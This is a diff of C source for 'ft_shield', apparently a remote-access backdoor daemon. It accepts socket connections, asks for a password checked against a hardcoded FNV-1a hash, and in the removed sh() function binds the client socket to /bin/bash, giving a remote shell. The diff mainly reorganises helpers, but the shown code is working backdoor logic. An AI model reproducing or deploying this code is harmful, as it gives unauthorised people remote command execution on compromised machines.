@@ -1,52 +1,12 @@
 #include "ft_shield.h"
-#include "errno.h"
 
 int nb_clients = 0;
 #define NAME "ft_shield"
-
-// Return 64-bit FNV-1a hash for a given password. See:
-// https://en.wikipedia.org/wiki/Fowler–Noll–Vo_hash_function
-static uint64_t fnv1a(const char* key) {
-    uint64_t hash = FNV_OFFSET;
-    for (const char* p = key; *p; p++) {
-        hash ^= (uint64_t)(unsigned char)(*p);
-        hash *= FNV_PRIME;
-    }
-    return hash;
-}
 
 char *clean_join(char *s1, char *s2) {
 	char *tmp = ft_strjoin(s1, s2);
 	free(s1);
 	return tmp;
-}
-
-void putstr(int fd, char *s) {
-	send(fd, s, ft_strlen(s), MSG_NOSIGNAL);
-}
-
-char *readline(int fd) {
-	char *cmd = ft_strdup("");
-	char buff[BUFFER_SIZE] = {};
-
-	while (1) {
-		int ret = recv(fd, buff, BUFFER_SIZE-1, MSG_DONTWAIT);
-		if (ret == 0) {
-			free(cmd);
-			return NULL;
-		} else if (ret > 0) {
-			buff[ret] = 0;
-			cmd = clean_join(cmd, buff);
-		} else {
-			if (errno == EAGAIN || errno == EWOULDBLOCK) {
-				return cmd;
-			}
-			free(cmd);
-			return NULL;
-		}
-	}
-
-	return cmd;
 }
 
 bool pgrep(char *name) {
@@ -77,31 +37,6 @@ bool pgrep(char *name) {
 
 	closedir(proc);
 	return false;
-}
-
-void sh(Client *client, int pipefd) {
-	if (!fork()) {
-		int pid_child = fork();
-		if (!pid_child) {
-			dup2(client->fd, 0);
-			dup2(client->fd, 1);
-			dup2(client->fd, 2);
-
-			execve("/bin/bash", (char*[]){"/bin/sh", NULL}, NULL);
-		} else {
-			waitpid(pid_child, NULL, 0);
-			write(pipefd, &client->fd, sizeof(int));
-		}
-		exit(0);
-	}
-}
-
-void check_password(Client *client, char *line) {
-	if (fnv1a(line) == HASHED_PASSWORD) {
-		client->logged = true;
-	} else {
-		putstr(client->fd, "Password: ");
-	}
 }
 
 int main() {
@@ -151,7 +86,6 @@ int main() {
 	while (true) {
 		int nfds = epoll_wait(epollfd, events, 256, -1);
 		if (nfds == -1) {
-			perror("wait: ");
 			continue;
 		}
 
@@ -165,15 +99,9 @@ int main() {
 				int newfd = new_connection(sock, epollfd, &addr, &ev);
 				add_client(clients, newfd);
 				nb_clients++;
-				putstr(newfd, "Password: ");
+				PUTSTR(newfd, "Password: ");
 			} else if (fd == pipefd[0]) {
-				int disconnected_fd;
-				int r = read(pipefd[0], &disconnected_fd, sizeof(int));
-				if (r != sizeof(int))
-					continue;
-				Client *client = get_client(clients, disconnected_fd);
-				if (client)
-					disconnect_client(client, epollfd, &ev);
+				disconnect_shell(fd, clients, epollfd, &ev);
 			} else {
 				Client *client = get_client(clients, events[n].data.fd);
 				if (!client) {
@@ -198,7 +126,7 @@ int main() {
 					shell = true;
 					disconnect_client(client, epollfd, &ev);
 				} else if (!ft_strcmp(line, "?\n")) {
-					putstr(client->fd, HELP);
+					PUTSTR(client->fd, HELP);
 				}
 
 				free(line);
